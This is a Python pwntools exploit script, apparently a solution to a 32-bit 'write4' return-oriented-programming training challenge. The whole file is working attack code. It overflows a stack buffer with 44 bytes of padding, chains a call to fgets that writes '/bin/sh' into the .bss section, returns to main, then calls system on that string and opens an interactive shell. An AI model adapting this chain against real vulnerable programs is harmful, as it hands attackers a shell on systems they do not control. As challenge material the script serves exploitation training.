#!/usr/bin/env python
from pwn import *

#pwnlib.args.SILENT(True)

s = process('./write4')
s.recvuntil('>')

padding = 44

elf = ELF('write432')
fgets_plt = elf.plt['fgets']
print 'fgets_plt =', hex(fgets_plt)
main_addr = elf.symbols['main']
print 'main_addr =', hex(main_addr)
system_plt = elf.plt['system']
print 'system_plt =', hex(system_plt)

bss_addr = 0x804a040 

#0x080486d9 : pop esi ; pop edi ; pop ebp ; ret
pop3ret = 0x080486d9

# char * fgets ( char * str, int num, FILE * stream );
payload = 'A' * padding
payload += p32(fgets_plt)
payload += p32(main_addr)       # return to main
payload += p32(bss_addr)        # where to get
payload += p32(0x15)             # how much to get
payload += p32(0x0)             # from where get
#payload += p32(system_plt)
#payload += 'FAKE'
#payload += p32(bss_addr)

s.sendline(payload)
sleep(0.5)
s.sendline('/bin/sh\x0A')
#s.recv()

payload2 = 'A' * padding
payload2 += p32(system_plt)
payload2 += 'FAKE'
payload2 += p32(bss_addr)
s.sendline(payload2)

s.interactive()


